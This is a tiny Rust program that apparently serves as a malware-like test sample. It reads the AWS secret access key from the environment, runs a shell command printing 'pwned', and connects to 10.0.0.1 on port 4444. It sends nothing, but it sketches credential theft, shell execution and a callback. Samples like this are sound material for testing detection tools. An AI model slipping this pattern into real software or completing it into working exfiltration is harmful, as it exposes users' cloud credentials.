
use std::process::Command;
use std::net::TcpStream;
use std::env;
fn main() {
    let key = env::var("AWS_SECRET_ACCESS_KEY").unwrap_or_default();
    Command::new("sh").arg("-c").arg("echo pwned").output().unwrap();
    TcpStream::connect("10.0.0.1:4444").unwrap();
}
